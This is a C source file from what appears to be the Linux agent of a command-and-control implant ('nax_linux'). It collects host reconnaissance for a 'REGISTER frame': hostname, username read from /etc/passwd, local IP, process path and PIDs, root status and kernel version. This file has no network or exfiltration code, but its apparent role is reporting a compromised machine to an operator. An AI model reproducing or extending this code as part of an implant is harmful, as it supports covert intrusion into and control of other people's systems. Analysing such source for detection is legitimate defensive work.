/* nax_linux/src/Core/sysinfo.c
 * Gather hostname, username, IP, PID, arch, OS version for REGISTER frame.
 * Pure POSIX — no external dependencies beyond libc.
 */

#include "nax_linux.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <errno.h>
#include <sys/syscall.h>

typedef struct {
    char     hostname[256];
    char     username[128];
    char     ip[64];
    char     domain[64];
    char     procname[256];
    char     imgpath[512];
    char     osver[64];
    uint32_t pid;
    uint32_t tid;
    uint32_t ppid;
    uint32_t os_major;
    uint32_t os_minor;
    uint16_t os_build;
    uint8_t  elevated;
} NaxSysInfo;

/* Read /proc/self/exe to get the full image path */
static void get_imgpath(char *buf, size_t len)
{
    ssize_t r = readlink("/proc/self/exe", buf, len - 1);
    if (r > 0) {
        buf[r] = '\0';
    } else {
        strncpy(buf, "unknown", len - 1);
    }
}

/* Extract basename from a path */
static const char *path_basename(const char *path)
{
    const char *p = strrchr(path, '/');
    return p ? p + 1 : path;
}

/* Get the first non-loopback IPv4 address via ioctl — avoids NSS/dlopen */
static void get_local_ip(char *buf, size_t len)
{
    strncpy(buf, "127.0.0.1", len - 1);
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct ifconf ifc;
    char ibuf[2048];
    ifc.ifc_len = sizeof(ibuf);
    ifc.ifc_buf = ibuf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == 0) {
        struct ifreq *it  = ifc.ifc_req;
        struct ifreq *end = it + (ifc.ifc_len / sizeof(*it));
        for (; it != end; ++it) {
            struct sockaddr_in *sin = (struct sockaddr_in *)&it->ifr_addr;
            if (sin->sin_family != AF_INET) continue;
            uint32_t addr = ntohl(sin->sin_addr.s_addr);
            if ((addr >> 24) == 127) continue;  /* skip loopback */
            inet_ntop(AF_INET, &sin->sin_addr, buf, (socklen_t)len);
            break;
        }
    }
    close(sock);
}

/* Parse os major/minor/build from uname release string */
static void parse_os_ver(const char *release,
                         uint32_t *major, uint32_t *minor, uint16_t *build)
{
    *major = 0; *minor = 0; *build = 0;
    sscanf(release, "%u.%u.%hu", major, minor, build);
}

void nax_gather_sysinfo(NaxSysInfo *info)
{
    memset(info, 0, sizeof(*info));

    /* hostname */
    gethostname(info->hostname, sizeof(info->hostname) - 1);

    /* username — parse /etc/passwd directly to avoid NSS dlopen
     * (glibc static + libnss_compat causes SIGFPE on some systems) */
    {
        uid_t uid = getuid();
        int found = 0;
        FILE *fp = fopen("/etc/passwd", "r");
        if (fp) {
            char line[256];
            while (fgets(line, sizeof(line), fp)) {
                char uname[64];
                unsigned int u;
                if (sscanf(line, "%63[^:]:%*[^:]:%u:", uname, &u) == 2 && u == (unsigned)uid) {
                    strncpy(info->username, uname, sizeof(info->username) - 1);
                    found = 1;
                    break;
                }
            }
            fclose(fp);
        }
        if (!found)
            snprintf(info->username, sizeof(info->username), "uid%u", (unsigned)uid);
    }

    /* IP */
    get_local_ip(info->ip, sizeof(info->ip));

    /* domain — use hostname as workgroup on Linux */
    strncpy(info->domain, info->hostname, sizeof(info->domain) - 1);

    /* image path and process name */
    get_imgpath(info->imgpath, sizeof(info->imgpath));
    strncpy(info->procname, path_basename(info->imgpath), sizeof(info->procname) - 1);

    /* PIDs */
    info->pid  = (uint32_t)getpid();
    info->ppid = (uint32_t)getppid();
    info->tid  = (uint32_t)getppid();  /* parent PID — more useful than TID in single-thread */

    /* elevated */
    info->elevated = (getuid() == 0) ? 1 : 0;

    /* OS version */
    struct utsname uts;
    if (uname(&uts) == 0) {
        parse_os_ver(uts.release, &info->os_major, &info->os_minor, &info->os_build);
        snprintf(info->osver, sizeof(info->osver), "Linux %s", uts.release);
    }
}
